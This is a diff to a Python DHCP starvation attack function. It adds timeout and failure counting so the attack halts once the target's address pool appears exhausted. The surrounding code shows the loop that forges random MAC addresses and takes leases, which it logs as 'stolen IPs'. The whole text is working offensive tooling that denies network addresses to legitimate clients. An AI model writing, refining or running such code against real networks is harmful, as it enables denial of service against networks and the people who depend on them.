@@ -235,6 +235,11 @@ def dhcp_starvation_attack(interface, dhcp_server):
     
     stop_attack_flag.clear()
     
+    # Timeout tracking
+    last_ip_time = time.time()
+    timeout_seconds = 5
+    consecutive_failures = 0
+    
     # Get server MAC address
     server_mac = None
     try:
@@ -250,6 +255,13 @@ def dhcp_starvation_attack(interface, dhcp_server):
     
     try:
         while attack_running and not stop_attack_flag.is_set():
+            # Check timeout - stop if no new IPs for 5 seconds
+            elapsed_since_last_ip = time.time() - last_ip_time
+            if elapsed_since_last_ip > timeout_seconds and len(stolen_ips) > 0:
+                print(f"[!] No new IPs acquired for {timeout_seconds} seconds - Pool appears saturated")
+                print(f"[!] Stopping attack. Total IPs acquired: {len(stolen_ips)}")
+                break
+            
             # Generate random MAC address
             mac = RandMAC()
             
@@ -259,6 +271,7 @@ def dhcp_starvation_attack(interface, dhcp_server):
             # Wait for DHCP offer with retry logic
             retry_count = 0
             max_retries = 3
+            ip_acquired_this_round = False
             
             while retry_count < max_retries:
                 print(f"[*] Waiting for DHCP offer (attempt {retry_count + 1}/{max_retries})...")
@@ -313,6 +326,10 @@ def dhcp_starvation_attack(interface, dhcp_server):
                             if not any(ip['ip'] == offered_ip for ip in stolen_ips):
                                 stolen_ips.append(ip_entry)
                                 print(f"[✓] IP {offered_ip} acquired! Total: {len(stolen_ips)}")
+                                # Reset timeout - we got a new IP!
+                                last_ip_time = time.time()
+                                consecutive_failures = 0
+                                ip_acquired_this_round = True
                             
                             # Break out of retry loop
                             break
@@ -324,6 +341,12 @@ def dhcp_starvation_attack(interface, dhcp_server):
                         retry_count += 1
                 else:
                     retry_count += 1
+            
+            # Track consecutive failures
+            if not ip_acquired_this_round:
+                consecutive_failures += 1
+                if consecutive_failures >= 3:
+                    print(f"[!] {consecutive_failures} consecutive failures - checking timeout...")
             
             # Small delay between requests
             time.sleep(0.2)
